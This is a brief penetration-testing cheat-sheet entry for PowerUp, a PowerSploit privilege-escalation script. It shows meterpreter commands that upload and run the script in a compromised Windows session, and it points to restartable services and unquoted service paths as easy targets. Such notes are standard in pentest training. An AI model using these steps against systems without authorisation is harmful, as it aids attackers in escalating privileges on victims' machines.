# PowerUP
A script to help identify common privesc vulnerabilities.
Source: [GitHub](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)

## Meterpreter
Once the script is downloaded, upload it to your meterpreter session:
```sh
meterpreter > upload PowerUp.ps1
meterpreter > load powershell
meterpreter > powershell_shell

PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```

Look for entries that have `CanRestart: True` and the "Unquoted Service Paths" for some low hanging fruit.
